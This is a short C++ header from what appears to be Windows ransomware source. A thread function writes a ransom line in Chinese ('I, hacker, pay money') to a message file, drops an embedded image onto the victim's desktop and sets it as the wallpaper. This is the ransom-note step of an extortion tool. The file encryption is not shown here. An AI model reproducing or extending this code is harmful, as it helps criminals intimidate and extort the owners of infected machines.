#pragma once
#include <Windows.h>
#include "var.h"
#include "Pic.h"
#include "tool.h"
using std::endl;
using std::ios;

DWORD WINAPI Msg(LPVOID lpParameter)
{
	MSGWriter << "我, 黑客, 打钱" << endl;
	MSGWriter << "================================" << endl;
	string NPath = DesktopPath + "\\pic.jpg";
	ofstream p_output(NPath, ios::out | ios::binary);
	p_output.write(PIC, 11611);
	p_output.close();
	wstring Tmp = stringTowstring(NPath);
	SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)Tmp.c_str(), SPIF_SENDCHANGE); //设置壁纸
	int test = GetLastError();
	return 0L;
}
